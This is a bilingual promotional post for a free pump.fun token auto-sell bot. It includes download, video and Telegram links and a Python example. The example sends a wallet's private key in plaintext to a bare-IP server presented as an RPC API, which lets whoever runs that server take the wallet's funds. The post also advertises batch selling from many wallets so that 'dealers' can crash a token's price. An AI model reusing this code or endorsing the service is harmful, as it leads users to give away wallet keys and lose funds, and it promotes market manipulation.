大家好，今天给大家接收pumpfun 这个网站的自动卖出功能的免费软件

1：单个钱包私钥用软件或者api 接口自动卖出-- 普通用户卖出，有的时候价格上涨太快，
需要迅速卖出获利  ，

2：多个钱包私钥用软件批量卖出--庄家使用砸盘的功能  ，

3：可以用卖出API 接口集成到你自己的软件中。 

Hello everyone, today I will give you the free software with automatic selling function of the website pumpfun

1: Use software or API interface to automatically sell a single wallet private key - ordinary users sell, sometimes the price rises too fast,
need to make a quick profit,

2: Use software to sell multiple wallet private keys in batches - the dealer uses the function of smashing the market,

3: You can use the sellAPI interface to integrate it into your own software.

pumpfun代币自动卖出免费机器人软件 软件下载网址： https://www.shouu.shop/cn/xiazai.html
Pumpfun token automatic selling free robot software Software download website: https://www.shouu.shop/cn/xiazai.html



视频教程/YouTube video：  https://www.youtube.com/watch?v=4sfhfJF1zVo

电报账户/telegram account：https://t.me/bz202510

import requests

# === 配置你的 RPC API 地址 ===

RPC_URL = "http://163.172.90.77:5001/rpc"




# === 自定义请求参数 ===
payload = {
    "jsonrpc": "2.0",
    "method": "sell_token",
    "params": {
        "amount": "10%",  # 可选: "all", "1/10", "25%"
        "private_key": "Lz4TRLvG9hszM4xf9Vktp46gZVERg11ZaC8ApgvUezC46BJmQot8jtt4mKM6WJmqscZBk4JoGMh3FAxVu7HpWXY",
        "mint": "uaXcpvH3hTYKBTG1su9ieVp5eQcG2wYLHvCNLwFpump",
        "slippage": 0.25
    },
    "id": 1
}

# === 发送请求 ===
try:
    response = requests.post(RPC_URL, json=payload)
    result = response.json()
    print("✅ 响应内容：")
    print(result)

    # 如果成功
    if "result" in result:
        print("📦 交易链接：", result["result"])
    elif "error" in result:
        print("❌ 错误信息：", result["error"]["message"])

except Exception as e:
    print("请求失败：", e)
